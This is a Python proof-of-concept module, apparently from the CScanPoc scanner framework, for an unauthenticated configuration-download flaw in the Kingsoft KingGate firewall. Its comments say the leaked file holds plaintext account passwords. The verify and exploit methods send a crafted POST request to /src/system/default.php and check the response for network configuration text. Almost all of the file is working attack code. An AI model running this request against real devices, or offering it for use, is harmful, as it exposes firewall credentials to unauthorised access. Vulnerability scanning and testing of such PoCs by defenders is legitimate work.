# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'KingSoft_0002'  # 平台漏洞编号，留空
    name = '金山KingGate防火墙 配置文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-08-19'  # 漏洞公布时间
    desc = '''
        金山旗下"KingGate"硬件防火墙产品存在设计缺陷无需登录情况下任意下载系统配置文件（包含明文账号密码）。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金山软件'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f932d241-330f-497c-91fe-dbdf2d9041bb'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #info:http://www.wooyun.org/bugs/wooyun-2010-0135128
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/src/system/default.php'
            postdata = "IG_type=IG_backup"
            code, head, res, errcode, _ = hh.http(url, post=postdata)
            if code == 200 and 'config network' in res:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
